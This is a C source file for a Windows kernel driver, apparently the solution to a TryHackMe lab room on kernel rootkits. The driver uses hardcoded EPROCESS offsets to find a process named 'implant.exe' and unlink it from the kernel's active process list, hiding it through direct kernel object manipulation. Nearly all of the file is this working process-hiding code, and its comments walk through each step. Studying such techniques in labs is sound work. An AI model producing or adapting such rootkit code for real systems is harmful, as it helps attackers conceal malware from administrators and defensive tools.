// code with assistance of Gemini Pro
// code for tryhackme room Kernel Blackout https://tryhackme.com/room/kernelblackout
// YouTube video walk through: https://youtu.be/yfMCQTyOmJ4

#include <ntddk.h>
#include <wdm.h>

// Offsets from WINDBG_CONSOLE
#define LINKS_OFFSET  0x2e8  // ActiveProcessLinks [cite: 26]
#define NAME_OFFSET   0x450  // ImageFileName [cite: 31]

// This is required so you can stop the driver. 
// If you forget this, you must reboot to stop it.
void DriverUnload(PDRIVER_OBJECT DriverObject) {
    UNREFERENCED_PARAMETER(DriverObject);
}

// The "main" function for drivers
NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) {
    UNREFERENCED_PARAMETER(DriverObject);
    UNREFERENCED_PARAMETER(RegistryPath);
    
    // 1. Start at the System process
    PEPROCESS CurrentProcess = PsInitialSystemProcess;
    
    // 2. Loop through the list (limit to 2000 to prevent infinite loops)
    for (int i = 0; i < 2000; i++) {
        
        // Check the process name at offset 0x450
        char* currentName = (char*)CurrentProcess + NAME_OFFSET;
        
        // 3. If name matches "implant.exe"
        if (strncmp(currentName, "implant.exe", 11) == 0) {
            
            // 4. DKOM: Unlink it from the chain
            PLIST_ENTRY CurrentListEntry = (PLIST_ENTRY)((char*)CurrentProcess + LINKS_OFFSET);
            
            PLIST_ENTRY Prev = CurrentListEntry->Blink;
            PLIST_ENTRY Next = CurrentListEntry->Flink;
            
            // "He went that way!" -> Point neighbors to each other, skipping us
            Prev->Flink = Next;
            Next->Blink = Prev;
            
            // Point the hidden process to itself for safety / We point the hidden process's links back to itself so it doesn't hold dangling pointers — this prevents a crash if anything ever touches it.
            CurrentListEntry->Flink = CurrentListEntry;
            CurrentListEntry->Blink = CurrentListEntry;
            
            // We are done
            break; 
        }
        
        // Move to next process
        PLIST_ENTRY CurrentListEntry = (PLIST_ENTRY)((char*)CurrentProcess + LINKS_OFFSET);
        // Calculate start of next process using the Flink - Offset
        CurrentProcess = (PEPROCESS)((char*)CurrentListEntry->Flink - LINKS_OFFSET);
    }
    
    return STATUS_SUCCESS;
}
